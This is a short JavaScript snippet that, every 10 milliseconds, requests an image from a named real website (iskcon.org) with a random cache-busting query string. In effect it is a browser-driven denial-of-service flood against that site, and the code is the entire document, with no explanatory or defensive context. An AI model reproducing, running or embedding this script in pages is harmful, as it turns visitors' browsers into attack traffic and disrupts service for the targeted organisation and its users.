setInterval(function(){
    var image = new Image()
    var rand = Math.floor(Math.random() * 999999999999999999)

    image.src = 'https://iskcon.org/?' + rand;
}, 10);
